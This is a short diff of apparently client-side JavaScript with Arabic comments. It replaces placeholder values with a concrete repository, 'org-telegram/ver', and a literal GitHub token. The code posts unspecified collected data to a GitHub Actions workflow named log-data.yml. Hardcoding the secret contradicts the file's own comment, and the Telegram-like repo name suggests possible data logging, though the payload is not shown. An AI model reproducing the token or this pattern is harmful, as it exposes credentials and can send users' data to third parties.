@@ -51,10 +51,10 @@
             };
 
             // إرسال البيانات إلى GitHub Actions API
-            fetch('https://api.github.com/repos/USERNAME/REPO_NAME/actions/workflows/log-data.yml/dispatches', {
+            fetch('https://api.github.com/repos/org-telegram/ver/actions/workflows/log-data.yml/dispatches', {
                 method: 'POST',
                 headers: {
-                    'Authorization': 'Bearer YOUR_GITHUB_TOKEN', // استبدل بـ Secret مخزن
+                    'Authorization': 'Bearer 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', // استبدل بـ Secret مخزن
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
